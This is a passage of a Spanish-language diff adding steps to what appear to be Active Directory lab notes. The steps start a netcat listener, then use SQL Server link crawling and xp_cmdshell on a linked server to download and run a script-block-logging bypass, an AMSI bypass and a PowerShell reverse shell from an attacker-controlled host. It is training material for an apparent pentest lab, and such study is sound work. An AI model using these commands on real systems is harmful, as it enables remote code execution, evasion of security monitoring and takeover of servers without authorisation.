@@ -1532,4 +1532,16 @@ Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local  -Query 
 Ahora tendremos que modificar la herramienta *Invoke_PowerShellTcp.ps1* haciendo primero una copia y cambiando su nombre a *Invoke-PowerShellTcpEx.ps1*
 Lo editaremos en PowerShell ISE, añadiendo al final del archivo *Power -Reverse -IPAddress 172.16.100.97 -Port 443*
 
+Ahora nos pondremos en una nueva CMD en escucha
+```shell
+C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
+```
 
+En el HFS deberemos de tener los archivos correspondientes guardados
+
+Y cargaremos el archivo modificado al server SQL para obtener una reverse shell
+```shell
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.97/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.97/Amsi-Byp.txt);iex (iwr -UseBasicParsing http://172.16.100.97/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql7
+```
+
+En la reverse shell que se nos ha ejecutado
